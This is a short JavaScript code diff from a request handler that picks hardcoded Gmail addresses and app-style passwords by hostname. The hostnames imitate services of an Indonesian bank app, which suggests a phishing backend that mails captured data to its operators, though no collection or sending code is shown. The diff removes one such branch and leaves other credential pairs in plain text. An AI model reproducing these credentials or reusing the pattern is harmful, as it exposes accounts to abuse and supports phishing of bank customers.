@@ -21,10 +21,6 @@ export default function handler(req, res) {
         email = 'brimopasp@gmail.com';
         pass = 'ezbvulgxsjerhpnb';
 
-    } else if (url == 'app-log-brimo-bifast.herokuapp.com'){
-        email = 'brigacor80@gmail.com';
-        pass = 'zhzcfhbdtzipldsz';
-
     }
     else {
         email = 'bripembukaanrekening@gmail.com';
